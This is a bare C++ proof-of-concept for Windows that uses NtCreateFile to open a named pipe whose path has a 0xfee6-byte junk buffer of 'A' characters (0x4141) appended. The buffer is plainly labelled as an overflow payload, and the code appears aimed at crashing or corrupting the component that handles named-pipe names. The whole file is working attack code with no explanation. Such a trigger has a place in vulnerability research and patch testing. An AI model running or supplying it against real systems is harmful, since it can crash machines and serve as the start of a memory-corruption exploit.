#include <stdio.h>
#include <string>
#include <stdlib.h>
#include <atlstr.h>
#include <winternl.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")

#define OVERFLOWLENGTH 0xfee6

typedef NTSTATUS(NTAPI* pfnNtCreateFile)(
	_Out_ PHANDLE            FileHandle,
	_In_ ACCESS_MASK        DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_ PIO_STATUS_BLOCK   IoStatusBlock,
	_In_ PLARGE_INTEGER     AllocationSize,
	_In_ ULONG              FileAttributes,
	_In_ ULONG              ShareAccess,
	_In_ ULONG              CreateDisposition,
	_In_ ULONG              CreateOptions,
	_In_ PVOID              EaBuffer,
	_In_ ULONG              EaLength
	);

FARPROC GetProcAddressNT(LPCSTR lpName)
{
	return GetProcAddress(GetModuleHandleW(L"ntdll"), lpName);
}
#define DEFINE_NTDLL(x) pfn ## x f ## x = (pfn ## x)GetProcAddressNT(#x)

int main() {

    DEFINE_NTDLL(NtCreateFile);
	NTSTATUS Status;
	HANDLE hPipe = INVALID_HANDLE_VALUE;
	UNICODE_STRING name = { 0 };
	OBJECT_ATTRIBUTES obj_attr = { 0 };
	IO_STATUS_BLOCK io_status = { 0 };
	CString strPipeName = L"\\Device\\NamedPipe\\LOCAL\\";
	wchar_t JunkPayload[OVERFLOWLENGTH] = { 0 };
	wmemset(JunkPayload, 0x4141, OVERFLOWLENGTH / sizeof(wchar_t));
	strPipeName.Append(JunkPayload);
	RtlInitUnicodeString(&name, strPipeName.GetBuffer());
	InitializeObjectAttributes(&obj_attr, &name, OBJ_CASE_INSENSITIVE, NULL, nullptr);
	Status = fNtCreateFile(&hPipe, GENERIC_READ, &obj_attr, &io_status, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE, NULL, 0);
	if (hPipe == INVALID_HANDLE_VALUE) {
		return 0;
	}
	return 0;
}

